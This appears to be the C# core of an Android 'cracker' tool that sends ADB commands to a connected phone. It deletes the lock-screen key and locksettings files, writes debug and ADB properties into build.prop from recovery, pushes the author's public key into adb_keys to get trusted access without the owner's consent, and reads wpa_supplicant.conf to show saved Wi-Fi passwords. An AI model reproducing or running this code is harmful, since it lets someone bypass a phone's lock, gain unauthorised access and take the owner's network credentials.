using SMPHCracker.Model;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace SMPHCracker.Logic
{
    class Cracker : ICracker
    {
        public Status GetStatus()
        {
            String output = ADB.Devices();

            output = string.Join(" ", Regex.Split(output, @"(?:\r\n|\n|\r|\t)"));

            String[] split = output.Split(' ');

            switch (split[5])
            {
                case "unauthorized":
                    return Status.Unauthorized;

                case "device":
                    output = ADB.Shell("TestSu", true);

                    if(output.Contains("error") || output.Contains("denied"))
                        return Status.ADB;
                    else
                        return Status.Root;

                case "recovery":
                    return Status.Recovery;

                case "sideload":
                    return Status.Sideload;

                default:
                    return Status.NoDevice;

            }
        }

        public string GetBezeichnung()
        {
            return ADB.GetName();
        }

        //ShellSu
        public bool RemovePassoword(Status status)
        {
            if (status == Status.Root || status == Status.Recovery)
            {
                bool root = false;

                if (status == Status.Root)
                    root = true;

                ADB.Shell("mount data", root);

                //Remove LockScreen
                ADB.Shell("rm /data/system/*.key", root);

                //Reset LockSettings
                ADB.Shell("rm /data/system/locksettings*", root);

                return true;
            }
            else if (status == Status.Sideload)
            {
                return RemovePasswordSideload();
            }

            return false;
            //Needs Reboot
        }
        private bool RemovePasswordSideload()
        {
            return false;
        }

        //Recovery-Shell-Mode
        public bool EnableADB(Status status)
        {
            if (status == Status.Recovery)
            {
                //May not work because no Shell (o. Shell-SU) in Recovery!
                //No root because Recovery-Mode!

                //Add ADB-Settings
                ADB.Shell("mount data", false);
                ADB.Shell("\"echo -n 'mtp,adb' > /data/property/persist.sys.usb.config\"", false);

                //Activates ADB-Settings
                ADB.Shell("mount system", false);
                ADB.Shell("\"echo '' >> /system/build.prop\"", false);
                ADB.Shell("\"echo '# Enable ADB\' >> /system/build.prop\"", false);
                ADB.Shell("\"echo 'persist.service.ADB.enable=1' >> /system/build.prop\"", false);
                ADB.Shell("\"echo 'persist.service.debuggable=1' >> /system/build.prop\"", false);
                ADB.Shell("\"echo 'persist.sys.usb.config=mtp,adb' >> /system/build.prop\"", false);

                return true;
            }
            else if(status == Status.Sideload)
            {
                return EnableADBSideload();
            }

            return false;
        }
        private bool EnableADBSideload()
        {
            return false;
        }

        //ADB-SU Mode
        public bool VerifyADB(Status status)
        {
            if (status == Status.Recovery)
            {
                //Vertify PC for ADB
                ADB.Push(@"C:\Users\ErdnüßFrederic\.android\adbkey.pub", "/data/misc/adb/adb_keys");

                return true;
            }
            else if(status == Status.Sideload)
            {
                return VertifyADBSideload();
            }

            return false;
        }
        private bool VertifyADBSideload()
        {
            return false;
        }

        public string ShowWLANKeys(Status status)
        {
            if (status == Status.Root || status == Status.Recovery)
            {
                //Show WLAN-Keys 
                return ADB.Shell("cat /data/misc/wifi/wpa_supplicant.conf", true);
            }

            return "false";
        }
    }
}
